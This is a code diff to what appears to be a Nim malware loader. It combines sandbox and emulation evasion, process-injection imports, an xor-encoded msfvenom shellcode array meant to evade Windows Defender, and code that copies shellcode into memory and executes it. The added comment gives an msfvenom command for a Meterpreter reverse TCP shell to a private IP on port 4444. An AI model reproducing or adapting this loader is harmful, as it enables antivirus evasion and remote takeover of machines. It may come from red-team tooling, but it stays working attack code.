@@ -27,34 +27,6 @@ import evasion/antiEmulation
 import injection/createRemoteThread
 import injection/processHollowing
 
-#[
-proc decryptShellcode: =
-    func toByteSeq*(str: string): seq[byte] {.inline.} =
-        @(str.toOpenArrayByte(0, str.high))
-
-    let
-        password: string = ""
-        ivB64: string = ""
-        encB64: string = ""
-    var
-        ctx: CTR[aes256]
-        key: array[aes256.sizeKey, byte]
-        iv: seq[byte] = toByteSeq(decode(ivB64))
-        enc: seq[byte] = toByteSeq(decode(encB64))
-        dec: seq[byte] = newSeq[byte](len(enc))
-
-
-    # KDF based on SHA256
-    var expKey = sha256.digest(password)
-    copyMem(addr key[0], addr expKey.data[0], len(expKey.data))
-    ctx.init(key, iv)
-
-
-    # Decrypt the shellcode
-    ctx.decrypt(enc, dec)
-    ctx.clear()
-    hollowShellcode(dec)
-]#
 
 when isMainModule:
 
@@ -66,14 +38,7 @@ when isMainModule:
     # -----------------------------------------------------------------------------------------------
     # ANTI-SANDBOX / EMULATOR CHECKS
     # -----------------------------------------------------------------------------------------------
-    echo "[antiEmulation] Stand-by for anti-emulation checks to pass..."
-    if not sleepAndCheck():
-        echo "    [X] Sleep did not pass the check, exiting"
-        quit()
-    if isEmulated():
-        echo "    [X] VirtualAllocExNuma did not pass the check, exiting"
-        quit()
-    echo "[antiEmulation] Passed!"
+    antiEmulation()
     # -----------------------------------------------------------------------------------------------
     # API PATCHES AND EVASION
     # -----------------------------------------------------------------------------------------------
@@ -98,10 +63,11 @@ when isMainModule:
             return 
 
         elif defined(amd64):
-            # Using xor_dynamic encoder to stop Defender from detecting Metasploit shellcode, since we aren't 
+            # Using xor_dynamic encoder to stop Defender from detecting Metasploit shellcode static, since we aren't 
             # implementing any sort of shellcode encryption yet!
 
-            # msfvenom -p windows/x64/messagebox -e x64/xor_dynamic TITLE='THE GIBSON' TEXT='Hack the Planet!' EXITFUNC=thread -f csharp
+            #[
+            msfvenom -p windows/x64/messagebox -e x64/xor_dynamic TITLE='THE GIBSON' TEXT='Hack the Planet!' EXITFUNC=thread -f csharp
             const shellcode_length: int = 373
             var shellcode: array[shellcode_length, byte] = [
             byte 0xeb,0x27,0x5b,0x53,0x5f,0xb0,0x75,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,0x5e,
@@ -129,7 +95,13 @@ when isMainModule:
             0xaf,0x53,0x07,0x66,0x7b,0x7e,0x14,0x4d,0x55,0x9d,0xce,0xeb,0xc1,0x5c,0x75,
             0x77,0x7f,0x34,0x60,0x7c,0x71,0x34,0x44,0x78,0x75,0x7a,0x71,0x60,0x35,0x14,
             0x40,0x5c,0x51,0x34,0x53,0x5d,0x56,0x47,0x5b,0x5a,0x14,0x82,0x54]
+            ]#
 
+            # msfvenom -p windows/x64/meterpreter_reverse_tcp -e x64/xor_dynamic LHOST=192.168.0.155 LPORT=4444 EXITFUNC=thread -f csharp
+            const shellcode_length: int = 1
+            var shellcode: array[shellcode_length, byte] = [
+                byte 0x00,
+            ]
             # -----------------------------------------------------------------------------------------------
             # INJECTION
             # -----------------------------------------------------------------------------------------------
@@ -153,17 +125,18 @@ when isMainModule:
             )
 
             echo "[localInject]: Copying shellcode to newly allocated memory..."
+
+            # RtlMoveMemory
             copyMem(rPtr, shellcodePtr, shellcode_length)
+
+            # VirtualProtect
+            # Could mark the page as RX here to avoid the RWX alloc above.
 
             echo "[localInject]: Executing shellcode..."
             let f = cast[proc(){.nimcall.}](rPtr)
             f()
 
-            # VirtualAlloc
-            # RtlMoveMemory
-            # VirtualProtect
-            # CreateThread
-
+            # ---- OTHER INJECTION EXAMPLES, SOME INCOMPLETE ----
             # CreateRemoteThread Example
             # injectCreateRemoteThread(shellcode)
             
